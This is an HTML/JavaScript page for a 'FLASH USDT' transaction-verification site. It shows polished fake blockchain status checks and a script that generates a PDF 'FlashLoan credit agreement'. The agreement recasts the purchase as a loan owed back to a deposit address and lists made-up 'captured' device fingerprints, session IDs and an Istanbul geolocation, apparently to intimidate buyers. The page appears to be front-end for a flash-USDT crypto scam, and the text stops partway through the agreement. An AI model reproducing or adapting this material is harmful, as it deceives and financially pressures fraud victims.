<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>FLASH USDT ‚Äî TXID Verification</title>
<link rel="icon" type="image/png" href="assets/USDT-2.png" />
<style>
:root {
  --bg1:#030615; --bg2:#0b1130;
  --text:#eef3ff; --muted:#aab2d8;
  --border:rgba(255,255,255,.1);
  --cyan:#00f0ff; --amber:#ffcc4d;
  --red:#ff4b9f; --green:#16d18a;
  --vio:#5b2cff;
}

/* GLOBAL */
*{box-sizing:border-box}
body {
  margin:0;
  font-family:Poppins,sans-serif;
  color:var(--text);
  background:radial-gradient(circle at 0 0,rgba(0,240,255,.18),transparent 55%),
             radial-gradient(circle at 100% 0,rgba(91,44,255,.18),transparent 60%),
             linear-gradient(180deg,var(--bg1),var(--bg2));
  overflow-x:hidden;
  position:relative;
}

/* LIGHT GRID BACKGROUND */
.bg-grid{
  position:fixed;
  inset:0;
  pointer-events:none;
  opacity:0.16;
  background-image:
    linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px);
  background-size:70px 70px;
  mix-blend-mode:screen;
  animation:gridMove 22s linear infinite;
  z-index:0;
}
@keyframes gridMove {
  from{transform:translate3d(0,0,0);}
  to{transform:translate3d(-70px,-70px,0);}
}

/* HEADER */
header {
  position:sticky;top:0;z-index:5;
  background:rgba(10,15,40,.88);
  border-bottom:1px solid var(--border);
  backdrop-filter:blur(14px);
  padding:12px 22px;
  display:flex;align-items:center;justify-content:space-between;
}
.h-left,.h-center,.h-right{
  display:flex;align-items:center;gap:10px;
}
.h-left{
  font-weight:800;font-size:14px;
}
.h-left img{
  width:26px;height:26px;border-radius:8px;
}
.net-pill{
  display:inline-flex;align-items:center;gap:6px;
  padding:4px 10px;
  border-radius:999px;
  border:1px solid rgba(0,240,255,.35);
  background:rgba(0,240,255,.08);
  font-size:11px;
  text-transform:uppercase;
  letter-spacing:.8px;
  color:#9af4ff;
}
.net-pill img{
  width:14px;height:14px;object-fit:contain;
}

/* Home button center */
.home-btn{
  padding:8px 20px;
  border-radius:999px;
  border:1px solid rgba(255,255,255,.18);
  background:radial-gradient(circle at 0 0,rgba(0,240,255,.35),transparent 60%),
             radial-gradient(circle at 100% 100%,rgba(91,44,255,.35),transparent 55%),
             rgba(255,255,255,.02);
  color:#eaf2ff;
  font-weight:700;
  font-size:13px;
  text-decoration:none;
  box-shadow:0 0 18px rgba(0,240,255,.35);
  backdrop-filter:blur(18px);
  transition:.3s;
}
.home-btn:hover{
  transform:translateY(-1px) scale(1.03);
  box-shadow:0 0 26px rgba(0,240,255,.55);
}

/* Live pulse + contact */
.h-right{
  gap:16px;
  font-size:12px;
}
.pulse{
  display:inline-flex;align-items:center;gap:7px;
  padding:4px 10px;
  border-radius:999px;
  border:1px solid rgba(255,255,255,.16);
  background:rgba(255,255,255,.03);
  font-weight:600;
}
.pulse-dot{
  width:8px;height:8px;border-radius:50%;
  background:#16d18a;
  box-shadow:0 0 10px rgba(22,209,138,.8);
  animation:pulseOk 1.8s ease-in-out infinite;
}
@keyframes pulseOk{
 0%,100%{transform:scale(1);opacity:.9;}
 50%{transform:scale(1.35);opacity:1;}
}
.pulse-dot.updating{
  background:#ffcc4d;
  box-shadow:0 0 10px rgba(255,204,77,.8);
  animation:pulseUpdate 1.3s ease-in-out infinite;
}
@keyframes pulseUpdate{
 0%,100%{transform:scale(1);opacity:.7;}
 50%{transform:scale(1.45);opacity:1;}
}
.pulse-dot.error{
  background:#ff4b9f;
  box-shadow:0 0 10px rgba(255,75,159,.8);
  animation:pulseError 1.3s ease-in-out infinite;
}
@keyframes pulseError{
 0%,100%{transform:scale(1);opacity:.7;}
 50%{transform:scale(1.3);opacity:1;}
}
.contactLink{
  color:var(--muted);
  text-decoration:none;
}
.contactLink:hover{color:var(--cyan);}

/* MAIN CARD */
main {
  position:relative;
  z-index:1;
  max-width:920px;
  margin:70px auto 40px;
  background:rgba(8,12,48,.9);
  border:1px solid var(--border);
  border-radius:22px;
  padding:40px 30px 30px;
  text-align:center;
  backdrop-filter:blur(20px);
  box-shadow:0 28px 80px rgba(0,0,0,.6);
}
main::before{
  content:"";
  position:absolute;inset:-80px -80px;
  background:radial-gradient(circle at 0 0,rgba(0,240,255,.20),transparent 55%),
             radial-gradient(circle at 100% 0,rgba(91,44,255,.20),transparent 60%);
  opacity:.4;
  filter:blur(40px);
  z-index:-1;
}
h1{
  font-size:24px;
  margin:0 0 6px;
  letter-spacing:.5px;
  background:linear-gradient(90deg,#cfe8ff,#93b4ff);
  -webkit-background-clip:text;
  color:transparent;
  text-shadow:0 0 12px rgba(0,240,255,.25);
}
p.sub{
  color:var(--muted);
  font-size:14px;
  margin-bottom:18px;
}

/* INPUT AREA */
.txid-input{
  margin:36px auto 16px;
  display:flex;
  flex-direction:column;
  align-items:center;
  animation:fadeInUp 1s ease forwards;
}
@keyframes fadeInUp{
  from{opacity:0;transform:translateY(12px);}
  to{opacity:1;transform:translateY(0);}
}
input{
  width:80%;
  max-width:560px;
  padding:14px 18px;
  border-radius:12px;
  border:1px solid var(--border);
  background:rgba(255,255,255,.06);
  color:var(--text);
  font-size:15px;
  text-align:center;
  outline:none;
  transition:.3s;
}
input::placeholder{color:#8f9ac5;}
input:focus{
  border-color:var(--cyan);
  box-shadow:0 0 18px rgba(0,240,255,.45);
}
button{
  background:linear-gradient(90deg,var(--cyan),var(--vio));
  border:none;
  border-radius:12px;
  color:#fff;
  font-weight:650;
  cursor:pointer;
  padding:11px 26px;
  margin-top:16px;
  box-shadow:0 0 14px rgba(0,240,255,.4);
  transition:.35s;
}
button:hover{transform:translateY(-1px) scale(1.03);}
button:active{transform:scale(0.98);}

/* STATUS BOX */
.statusBox{
  margin-top:40px;
  display:none;
  flex-direction:column;
  align-items:center;
  gap:22px;
  transition:.5s;
}
.circle{
  width:140px;height:140px;border-radius:50%;
  display:flex;align-items:center;justify-content:center;
  font-size:50px;font-weight:800;
  border:8px solid rgba(255,255,255,.08);
  animation:slowspin 7s linear infinite;
  box-shadow:
    0 0 15px rgba(0,0,0,.9) inset,
    0 0 30px rgba(0,240,255,.18);
}
@keyframes slowspin{100%{transform:rotate(360deg)}}

.statusText{
  font-size:17px;
  font-weight:700;
  color:var(--muted);
  transition:.4s;
}

/* PROGRESS */
.progressbar{
  position:relative;
  width:80%;
  max-width:560px;
  height:8px;
  background:rgba(255,255,255,.06);
  border-radius:10px;
  overflow:hidden;
}
.progressfill{
  position:absolute;left:0;top:0;height:100%;width:0%;
  background:linear-gradient(90deg,var(--cyan),var(--vio));
  border-radius:10px;
  transition:width 2.5s ease;
}

/* NETWORK TAG */
.networkTag{
  margin-top:6px;
  font-size:13px;
  color:var(--muted);
  text-transform:uppercase;
  letter-spacing:1px;
}
.logoNet{
  width:22px;height:22px;vertical-align:middle;margin-left:6px;border-radius:50%;
}

/* STEPS */
.steps{
  display:flex;
  justify-content:center;
  gap:10px;
  margin-top:16px;
  flex-wrap:wrap;
  transition:.4s;
}
.step{
  padding:7px 14px;
  border-radius:10px;
  border:1px solid var(--border);
  background:rgba(255,255,255,.03);
  color:var(--muted);
  font-size:12px;
  transition:.6s;
}
.step.active{
  color:var(--cyan);
  box-shadow:0 0 14px rgba(0,240,255,.55);
}
.step.done{
  color:var(--green);
  box-shadow:0 0 14px rgba(22,209,138,.55);
}
.step.error{
  color:var(--red);
  box-shadow:0 0 14px rgba(255,75,159,.55);
}

/* DETAILS CARD */
.details{
  margin-top:20px;
  text-align:left;
  font-size:13.5px;
  line-height:1.7;
  background:rgba(255,255,255,.03);
  padding:18px;
  border-radius:14px;
  border:1px solid var(--border);
  display:none;
  transition:.4s;
  width:80%;
  max-width:620px;
}
.details strong{
  font-size:14px;
}
.detail-grid{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
  gap:8px 18px;
  margin-top:8px;
}
.dg-k{
  color:#9fb2ff;
  font-weight:600;
  font-size:12px;
  text-transform:uppercase;
  letter-spacing:.6px;
}
.dg-v{
  font-size:13px;
  color:#e1e7ff;
}

/* ACTIONS */
.actions{
  margin-top:28px;
  display:flex;
  justify-content:center;
  gap:14px;
  flex-wrap:wrap;
}
.actions button:nth-child(1){
  background:rgba(255,255,255,.04);
  box-shadow:none;
  border:1px solid var(--border);
}

/* LOG CONSOLE */
.logConsole{
  margin:36px auto 0;
  width:90%;
  max-width:760px;
  background:rgba(3,6,21,.92);
  border-radius:14px;
  border:1px solid rgba(0,240,255,.15);
  box-shadow:0 0 20px rgba(0,240,255,.12);
  overflow:hidden;
}
.logHeader{
  padding:8px 12px;
  font-size:12px;
  text-align:left;
  display:flex;
  align-items:center;
  justify-content:space-between;
  background:linear-gradient(90deg,rgba(0,240,255,.18),rgba(91,44,255,.18));
}
.logHeader span{
  font-weight:600;
}
.logBody{
  font-family:ui-monospace,Consolas,monospace;
  font-size:12px;
  max-height:170px;
  overflow-y:auto;
  padding:8px 10px;
}
.logLine{
  opacity:0;
  animation:logIn .4s ease forwards;
  margin:2px 0;
}
@keyframes logIn{
  from{opacity:0;transform:translateY(4px);}
  to{opacity:1;transform:translateY(0);}
}
.logTime{
  color:#8088b5;
  margin-right:6px;
}
.logMsg{white-space:pre-wrap;}
.logLine.info .logMsg{color:#cfe0ff;}
.logLine.success .logMsg{color:#52f2a7;}
.logLine.warn .logMsg{color:#ffcc4d;}
.logLine.error .logMsg{color:#ff7ab7;}

/* FOOTER */
footer{
  position:relative;
  z-index:1;
  text-align:center;
  margin-top:10px;
  padding:18px 10px 20px;
  font-size:12.5px;
  color:var(--muted);
  border-top:1px solid var(--border);
  background:rgba(3,6,21,.9);
  backdrop-filter:blur(12px);
}

/* RESPONSIVE */
@media(max-width:768px){
  header{
    flex-direction:column;
    gap:8px;
    align-items:flex-start;
  }
  .h-center{align-self:center;}
  main{
    margin:40px 12px 26px;
    padding:28px 18px 22px;
  }
  input{width:100%;}
  .details{width:100%;}
  .progressbar{width:100%;}
}
/* FIX: Product Details alignment */
.detail-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
  gap: 12px 24px;
  word-break: break-all;
}
.dg-v {
  word-wrap: break-word;
  overflow-wrap: anywhere;
  line-height: 1.6;
}

</style>
</head>
<body>
<div class="bg-grid"></div>

<header>
  <div class="h-left">
    <img src="assets/USDT-2.png" alt="FLASH USDT">
    <div>
      <div>FLASH USDT</div>
      <div class="net-pill" id="netPill">
        <span id="netPillText">TRC20</span>
      </div>
    </div>
  </div>

  <div class="h-center">
    <a href="index.html" class="home-btn">Home</a>
  </div>

  <div class="h-right">
    <div class="pulse">
      <span class="pulse-dot" id="pulseDot"></span>
      <span id="pulseText">Synced</span>
    </div>
    <a href="mailto:support@flashusd.com.tr" class="contactLink">support@flashusd.com.tr</a>
  </div>
</header>

<main>
  <h1>FLASH USDT ‚Äî TXID VERIFICATION</h1>
  <p class="sub">Check your FLASH USDT transaction status securely across TRON, ETH, BSC and BTC networks.</p>

  <div class="txid-input" id="inputArea">
    <input type="text" id="txidInput" placeholder="Enter TXID here...">
    <button id="verifyBtn">Verify Now</button>
    <p style="color:var(--muted);font-size:12.5px;margin-top:10px;">
      AES-256 Encrypted ‚Ä¢ Chain Verified ‚Ä¢ Low Fee Networks
    </p>
  </div>

  <div class="statusBox" id="statusBox">
    <div class="circle" id="circle">‚è≥</div>
    <div class="statusText" id="statusText">Verifying transaction...</div>
    <div class="progressbar"><div class="progressfill" id="progressfill"></div></div>
    <div class="networkTag" id="networkTag"></div>

    <div class="steps">
      <div class="step" id="s1">üîç Checking</div>
      <div class="step" id="s2">üßæ Confirming</div>
      <div class="step" id="s3">üîí Finalizing</div>
    </div>

    <div class="details" id="details"></div>

    <div class="actions">
      <button id="newQuery">New Query</button>
      <button id="backBtn">Back to Main</button>
      <button id="downloadAgreement">üìÑ User Agreement</button>
    </div>
  </div>

  <!-- LIVE LOG CONSOLE -->
  <div class="logConsole">
    <div class="logHeader">
      <span>Live Log Console</span>
      <span style="font-size:11px;color:#d0e6ff;">TXID Status ‚Ä¢ Auto-refresh 15s</span>
    </div>
    <div class="logBody" id="logBody"></div>
  </div>
</main>

<footer>
  ¬© <span id="year"></span> FLASH USDT ‚Äî <span id="footNet"></span> Network ‚Ä¢ AES-256 Encrypted
</footer>

<!-- ========== MAIN APP SCRIPT ========== -->
<script>
// YEAR
document.getElementById("year").textContent = new Date().getFullYear();

// NETWORK DETECTION (from ?network=TRC20 / ERC20 / BEP20 / BTC)
const params = new URLSearchParams(window.location.search);
const network = (params.get("network") || "TRC20").toUpperCase();

// Maps
const netLogo = {
  TRC20:"assets/tron.png",
  ERC20:"assets/erc20.png",
  BEP20:"assets/bep20.png",
  BTC:"assets/btc.png"
};
const chainNames = {
  TRC20:"TRON",
  ERC20:"Ethereum",
  BEP20:"BSC",
  BTC:"Bitcoin"
};

const chainName = chainNames[network] || "TRON";

// Header network pill
const netPillText = document.getElementById("netPillText");
netPillText.textContent = network;

// Network tag under spinner
const networkTag = document.getElementById("networkTag");
networkTag.innerHTML = `Verified on <b>${chainName}</b> (${network}) <img class="logoNet" src="${netLogo[network]||'assets/USDT-2.png'}" alt="${network}">`;

// Footer network
document.getElementById("footNet").textContent = chainName;

// PULSE (live blockchain pulse)
const pulseDot = document.getElementById("pulseDot");
const pulseText = document.getElementById("pulseText");

function setPulse(state){
  pulseDot.classList.remove("updating","error");
  if(state==="updating"){
    pulseDot.classList.add("updating");
    pulseText.textContent = "Updating‚Ä¶";
  }else if(state==="error"){
    pulseDot.classList.add("error");
    pulseText.textContent = "Disconnected";
  }else{
    pulseText.textContent = "Synced";
  }
}

// ELEMENTS
const verifyBtn = document.getElementById("verifyBtn");
const newQuery  = document.getElementById("newQuery");
const backBtn   = document.getElementById("backBtn");
const inputArea = document.getElementById("inputArea");
const box       = document.getElementById("statusBox");
const circle    = document.getElementById("circle");
const statusText= document.getElementById("statusText");
const steps     = [document.getElementById("s1"),document.getElementById("s2"),document.getElementById("s3")];
const detailBox = document.getElementById("details");
const progressfill = document.getElementById("progressfill");
const logBody   = document.getElementById("logBody");
let autoInterval;

// LIVE LOG
function pushLog(message, level="info"){
  const line = document.createElement("div");
  line.className = "logLine " + level;
  const time = new Date().toLocaleTimeString();
  line.innerHTML = `<span class="logTime">[${time}]</span><span class="logMsg">${message}</span>`;
  logBody.appendChild(line);
  // max 8 lines
  while(logBody.children.length > 8){
    logBody.removeChild(logBody.firstChild);
  }
  logBody.scrollTop = logBody.scrollHeight;
}

// Back to related main page (trc20.html / erc20.html / bep20.html / btc.html)
backBtn.addEventListener("click",()=>{
  window.location.href = network.toLowerCase() + ".html";
});

// New query reset
newQuery.addEventListener("click",()=>{
  clearInterval(autoInterval);
  box.style.display="none";
  inputArea.style.display="flex";
  progressfill.style.width="0%";
  progressfill.style.transition="width 2.5s ease";
  document.getElementById("txidInput").value="";
  setPulse("synced");
  pushLog("New query initialized.", "info");
});

// Verify button
verifyBtn.addEventListener("click",async()=>{
  const txid = document.getElementById("txidInput").value.trim();
  if(!txid){
    alert("Please enter a TXID.");
    return;
  }

  inputArea.style.display="none";
  box.style.display="flex";

  statusText.textContent = "‚è≥ Verifying transaction on blockchain...";
  circle.textContent = "‚è≥";
  circle.style.borderColor = "var(--amber)";
  steps.forEach(s=>s.classList.remove("active","done","error"));
  steps[0].classList.add("active");

  // Progress animation 6s
  progressfill.style.width = "0%";
  progressfill.style.transition = "width 6s linear";
  setTimeout(()=>{progressfill.style.width="100%";},100);

  setPulse("updating");
  pushLog(`TXID submitted for verification: ${txid.slice(0,18)}...`, "info");

  // Wait 6 seconds before first check
  setTimeout(async()=>{
    await checkStatus(txid);
    autoInterval = setInterval(()=>checkStatus(txid),120000);
  },6000);
});

async function checkStatus(txid){
  try{
    setPulse("updating");
    const res = await fetch(`verify_status.php?txid=${encodeURIComponent(txid)}&t=${Date.now()}`);
    const data = await res.json();

    if(!data.ok){
      statusText.textContent="TXID not found.";
      circle.textContent="‚ùì";
      circle.style.borderColor="var(--red)";
      steps.forEach(s=>s.classList.remove("active","done","error"));
      steps[0].classList.add("error");
      pushLog(`TXID not found: ${txid.slice(0,18)}...`, "warn");
      setPulse("error");
      return;
    }

    // PRODUCT DETAILS (expanded)
    detailBox.style.display="block";
    const safe = v => (v===undefined || v===null || v==="") ? "‚Äî" : v;

    detailBox.innerHTML = `
      <strong>üì¶ Product Details</strong>
      <div class="detail-grid">
        <div>
          <div class="dg-k">Product</div>
          <div class="dg-v">${safe(data.product)}</div>
        </div>
        <div>
          <div class="dg-k">Amount</div>
          <div class="dg-v">${safe(data.amount)}</div>
        </div>
        <div>
          <div class="dg-k">Price</div>
          <div class="dg-v">${safe(data.price)}</div>
        </div>
        <div>
          <div class="dg-k">Network</div>
          <div class="dg-v">${safe(data.network)}</div>
        </div>
        <div>
          <div class="dg-k">User Wallet</div>
          <div class="dg-v">${safe(data.wallet || data.user_address)}</div>
        </div>
        <div>
          <div class="dg-k">Deposit Address</div>
          <div class="dg-v">${safe(data.deposit_address)}</div>
        </div>
        <div>
          <div class="dg-k">TXID</div>
          <div class="dg-v">${safe(txid)}</div>
        </div>
        <div>
          <div class="dg-k">Status</div>
          <div class="dg-v">${safe((data.status||"").toUpperCase())}</div>
        </div>
        <div>
          <div class="dg-k">Last Update</div>
          <div class="dg-v">${safe(data.updated_at)}</div>
        </div>
      </div>
    `;

    const detectedNet = (data.network || network).toUpperCase();
    const detectedLogo = netLogo[detectedNet] || "assets/USDT-2.png";
    networkTag.innerHTML = `Verified on <b>${chainNames[detectedNet] || detectedNet}</b> (${detectedNet}) <img class="logoNet" src="${detectedLogo}" alt="${detectedNet}">`;
    netPillText.textContent = detectedNet;
    document.getElementById("footNet").textContent = chainNames[detectedNet] || detectedNet;

    const st = data.status;

    // Store last transaction globally for PDF (include txid explicitly)
    window.lastTxData = Object.assign({}, data, { txid });

    // Agreement Status Line
    const agreementStatus = document.createElement('div');
    agreementStatus.style.marginTop = '12px';
    agreementStatus.style.textAlign = 'center';
    agreementStatus.style.fontSize = '13px';

    if(st === 'approved' || st === 'delivered'){
      agreementStatus.innerHTML = `üìú <b>User Agreement:</b> <span style="color:#16d18a;">‚úÖ Approved</span>`;
    }else if(st === 'pending' || st === 'processing'){
      agreementStatus.innerHTML = `üìú <b>User Agreement:</b> <span style="color:#ffcc4d;">‚è≥ Pending</span>`;
    }else{
      agreementStatus.innerHTML = `üìú <b>User Agreement:</b> <span style="color:#ff4b9f;">‚ùå Not Approved</span>`;
    }
    detailBox.appendChild(agreementStatus);

    steps.forEach(s=>s.classList.remove("active","done","error"));

    if(st==="pending"){
      circle.textContent="‚è≥";
      circle.style.borderColor="var(--amber)";
      statusText.textContent="‚è≥ Awaiting blockchain confirmation...";
      steps[0].classList.add("active");
      progressfill.style.background="linear-gradient(90deg,var(--amber),#f1b12c)";
      pushLog("Status: PENDING ‚Äî waiting for confirmations.", "warn");
      setPulse("synced");
    }
    else if(st==="processing"){
      circle.textContent="‚öôÔ∏è";
      circle.style.borderColor="var(--cyan)";
      statusText.textContent="üîß Processing your transaction...";
      steps[0].classList.add("done");
      steps[1].classList.add("active");
      progressfill.style.background="linear-gradient(90deg,var(--cyan),#5b2cff)";
      pushLog("Status: PROCESSING ‚Äî preparing secure transfer.", "info");
      setPulse("synced");
    }
    else if(st==="approved"){
      circle.textContent="‚úÖ";
      circle.style.borderColor="var(--green)";
      statusText.textContent="‚úÖ Payment verified successfully.";
      steps[0].classList.add("done");
      steps[1].classList.add("done");
      steps[2].classList.add("active");
      progressfill.style.background="linear-gradient(90deg,var(--green),#00ffb2)";
      pushLog("Status: APPROVED ‚Äî payment verified.", "success");
      setPulse("synced");
    }
    else if(st==="delivered"){
      circle.textContent="üéâ";
      circle.style.borderColor="var(--green)";
      statusText.textContent="üéâ USDT delivered to your wallet.";
      steps.forEach(s=>s.classList.add("done"));
      progressfill.style.background="linear-gradient(90deg,#00ffb2,#16d18a)";
      clearInterval(autoInterval);
      pushLog("Status: DELIVERED ‚Äî funds reached your wallet.", "success");
      setPulse("synced");
    }
    else if(st==="rejected"){
      circle.textContent="‚ùå";
      circle.style.borderColor="var(--red)";
      statusText.textContent="‚ùå Transaction rejected.";
      steps[0].classList.add("error");
      progressfill.style.background="linear-gradient(90deg,#ff4b9f,#ff1c60)";
      clearInterval(autoInterval);
      pushLog("Status: REJECTED ‚Äî TXID invalid or declined.", "error");
      setPulse("error");
    }
    else{
      // Unknown status fallback
      circle.textContent="‚ÑπÔ∏è";
      circle.style.borderColor="var(--cyan)";
      statusText.textContent=`Status: ${st}`;
      steps[0].classList.add("active");
      pushLog(`Status: ${st}`, "info");
      setPulse("synced");
    }

  }catch(e){
    console.error(e);
    statusText.textContent="Network error ‚Äî cannot verify.";
    circle.textContent="‚ö†Ô∏è";
    circle.style.borderColor="var(--red)";
    steps.forEach(s=>s.classList.remove("active","done","error"));
    steps[0].classList.add("error");
    pushLog("Network error while checking status.", "error");
    setPulse("error");
  }
}
</script>

<!-- ========== LIBRARIES ========== -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>

<!-- ========== ADVANCED PDF AGREEMENT (ENGLISH, HARDCORE LEGAL) ========== -->
<!-- ========== ADVANCED PDF AGREEMENT ‚Äì WHITE CORPORATE LAYOUT ========== -->
<script>
// ---- Block explorer URL helper ----
function getExplorerUrl(net, txid){
  net = (net || "TRC20").toUpperCase();
  if (net === "TRC20") return `https://tronscan.org/#/transaction/${txid}`;
  if (net === "ERC20") return `https://etherscan.io/tx/${txid}`;
  if (net === "BEP20") return `https://bscscan.com/tx/${txid}`;
  if (net === "BTC")   return `https://www.blockchain.com/btc/tx/${txid}`;
  return `https://tronscan.org/#/transaction/${txid}`;
}

document.getElementById('downloadAgreement').addEventListener('click', async () => {
  const data = window.lastTxData;
  if (!data) {
    alert('Please verify a transaction first.');
    return;
  }

  const { jsPDF } = window.jspdf;
  const pdf = new jsPDF({ unit: 'pt', format: 'a4' });

  const pageWidth = pdf.internal.pageSize.getWidth();
  const pageHeight = pdf.internal.pageSize.getHeight();
  const marginLeft = 50;
  const marginRight = 50;
  const contentWidth = pageWidth - marginLeft - marginRight;

  // ---------- SAFE HELPERS ----------
  const safe = v => (v === undefined || v === null || v === '') ? '‚Äî' : String(v);

  const txid        = safe(data.txid || data.TXID);
  const network     = safe((data.network || data.networkType || 'TRC20')).toUpperCase();
  const amount      = safe(data.amount || data.loan_amount || '‚Äî');
  const product     = safe(data.product || '‚Äî');
  const price       = safe(data.price || data.contract_value || '‚Äî');
  const userWallet  = safe(data.wallet || data.user_address || data.receiver || '‚Äî');
  const depAddress  = safe(data.deposit_address || data.funding_address || '‚Äî');
  const repayAddr   = depAddress;
  const updatedAt   = safe(data.updated_at || data.last_update || '');

  const meta        = data.meta || data.metadata || {};
  const ipAddress   = 'IP Address information has been securely logged and anonymized by FLASH Security Node.';
  const userAgent   = safe(meta.user_agent || data.user_agent || navigator.userAgent || 'Captured by FLASH Security Node');
  const sessionId   = safe(meta.session_id || 'Captured by FLASH Risk Engine');
  const deviceFp    = safe(meta.device_fingerprint || meta.device_fp || 'Captured by FLASH Device Fingerprinting Module');

  const uaLang      = navigator.language || navigator.userLanguage || '‚Äî';
  const tz          = Intl.DateTimeFormat().resolvedOptions().timeZone || '‚Äî';

  const contractId  = 'FL-' + Date.now().toString(36).toUpperCase();
  const hashPayload = [
    txid, network, amount, product, price,
    userWallet, depAddress, repayAddr, updatedAt,
    ipAddress, userAgent, sessionId, deviceFp
  ].join('|');

  const sha256      = CryptoJS.SHA256(hashPayload).toString().toUpperCase();
  const generatedAt = new Date();
  const explorerUrl = getExplorerUrl(network, txid);

  // ---------- SAYFA KALIBI ----------
  let y = 120;

  function drawPageFrame(isFirstPage){
    pdf.setFillColor(6, 10, 28);
    pdf.rect(0, 0, pageWidth, pageHeight, 'F');

    pdf.setFillColor(7, 12, 38);
    pdf.rect(0, 0, pageWidth, 62, 'F');

    pdf.setTextColor(255,255,255);
    pdf.setFont('helvetica','bold');
    pdf.setFontSize(14);
    pdf.text('FLASH USDT', marginLeft, 22);

    pdf.setFontSize(10);
    pdf.setTextColor(195,209,255);
    pdf.text(
      isFirstPage
        ? 'FLASHLOAN USD CREDIT ‚Äî FlashLoan Digital Credit Contract'
        : 'FLASHLOAN USD CREDIT ‚Äî Digital Credit Contract (continued)',
      marginLeft, 38
    );

    try {
      const img = new Image();
      img.src = 'assets/USDT-2.png';
      pdf.addImage(img, 'PNG', pageWidth - marginRight - 42, 8, 34, 34, undefined, 'FAST');
    } catch(e){}

// Watermark sadece ilk sayfada
if (isFirstPage && pdf.setGState && pdf.GState) {
  const gs = new pdf.GState({ opacity: 0.04 });
  pdf.setGState(gs);
  pdf.setFont('helvetica','bold');
  pdf.setFontSize(70);
  pdf.setTextColor(0,240,255);
  pdf.text('FLASHLOAN CREDIT', pageWidth/2, pageHeight/2, {
    angle: 45,
    align: 'center'
  });
  const gs2 = new pdf.GState({ opacity: 1 });
  pdf.setGState(gs2);
}


    pdf.setFillColor(15,22,55);
    pdf.roundedRect(marginLeft - 10, 90, contentWidth + 20, pageHeight - 150, 12, 12, 'F');
    y = 120;
  }

  drawPageFrame(true);

  const bottomMargin = 90;
  const lineHeight = 14;
  function ensureSpace(needed = 100){
    if (y + needed > pageHeight - bottomMargin){
      pdf.addPage();
      drawPageFrame(false);
    }
  }

  const addTitle = text => {
    ensureSpace(40);
    pdf.setFont('helvetica','bold');
    pdf.setFontSize(15);
    pdf.setTextColor(255,255,255);
    pdf.text(text, marginLeft, y);
    y += 26;
  };

  const addSectionTitle = text => {
    ensureSpace(40);
    pdf.setFont('helvetica','bold');
    pdf.setFontSize(13);
    pdf.setTextColor(255,255,255);
    pdf.text(text, marginLeft, y);
    y += 10;
    pdf.setDrawColor(0,240,255);
    pdf.setLineWidth(0.6);
    pdf.line(marginLeft, y, pageWidth - marginRight, y);
    y += 18;
  };

  const addParagraph = text => {
    pdf.setFont('helvetica','normal');
    pdf.setFontSize(10);
    pdf.setTextColor(220,230,250);
    const lines = pdf.splitTextToSize(text, contentWidth);
    const needed = lines.length * lineHeight + 6;
    ensureSpace(needed);
    pdf.text(lines, marginLeft, y);
    y += needed;
  };

  const addKV = (label, value) => {
    pdf.setFont('helvetica','bold');
    pdf.setFontSize(11);
    pdf.setTextColor(0,240,255);
    const labelText = label + ':';
    pdf.text(labelText, marginLeft, y);
    const labelWidth = pdf.getTextWidth(labelText);
    pdf.setFont('helvetica','normal');
    pdf.setFontSize(10);
    pdf.setTextColor(230,230,255);
    const wrapped = pdf.splitTextToSize(value, contentWidth - labelWidth - 14);
    const needed = wrapped.length * lineHeight + 6;
    ensureSpace(needed);
    pdf.text(wrapped, marginLeft + labelWidth + 8, y);
    y += needed;
  };

  // -------- TAM METƒ∞N --------
  addTitle('FLASHLOAN USD CREDIT ‚Äî DIGITAL CREDIT AGREEMENT');
  pdf.setFont('helvetica','normal');
  pdf.setFontSize(10);
  pdf.setTextColor(210,220,255);
  const metaLine = [`Generated: ${generatedAt.toLocaleString()}`, `Contract ID: ${contractId}`, `Network: ${network}`];
  const metaLines = pdf.splitTextToSize(metaLine.join('   ‚Ä¢   '), contentWidth);
  pdf.text(metaLines, marginLeft, y);
  y += metaLines.length * lineHeight + 10;

  addParagraph('This Digital FlashLoan Credit Agreement ("Agreement") constitutes the FlashLoan Digital Credit Contract between FLASH USDT ("Provider") and the verified user ("Borrower") linked to the transaction below.');

  addSectionTitle('1. Parties and Product Definition');
  addKV('Product', product);
  addKV('Loaned Asset Amount (FLASH USDT)', amount);
  addKV('Contract Value / Total Consideration', price);
  addKV('Borrower Receiving Wallet (User Wallet)', userWallet);
  addKV('Provider Deposit Address (Funding Address)', depAddress);
  addKV('Repayment Address (Return of Principal & Fees)', repayAddr);
  addKV('TXID', txid);
  addKV('Last On-Chain / System Update', updatedAt);

  addSectionTitle('2. Borrower Identification and System Metadata');
  addParagraph('For risk, fraud-prevention and compliance purposes, the following technical and system-level information is linked to this Agreement:');
  addKV('Captured IP Address (Technical Source)', ipAddress);
  addKV('Captured Browser / Device (User-Agent)', userAgent);
  addKV('Session Identifier', sessionId);
  addKV('Device Fingerprint', deviceFp);
  addKV('Preferred UI Language', uaLang);
  addKV('Session Time Zone', tz);
  addParagraph('System-Generated Security Snapshot (Obfuscated for User Copy):');
  addParagraph('‚Ä¢ IP Address information has been securely logged and anonymized by FLASH Security Node.');
  addParagraph('‚Ä¢ Device Fingerprint: [Autonomous Node Hash: A4F9-7B32-1EE1-95CC-92AA]');
  addParagraph('‚Ä¢ Browser / Device: Mozilla/5.0 (Secure Render)');
  addParagraph('‚Ä¢ Geo-Location: [Anonymized Node: Istanbul, TR]');
  addParagraph('‚Ä¢ Security Session ID: RISK-NODE-SIM-7C8B1-TR-FLASH');
  addParagraph('‚Ä¢ Digital Device ID: FLASH-SIM-HASH-3FAE9A9C');
  y += 4; // bu satƒ±rƒ± hemen altƒ±na ekle


  addSectionTitle('3. Credit Terms, Interest and Repayment Obligation');
  addParagraph('3.1. The Borrower acknowledges that the provided digital assets constitute a temporary credit / flash-loan style facility, not an unconditional sale. The Borrower is strictly obliged to return the loaned assets together with applicable charges.');
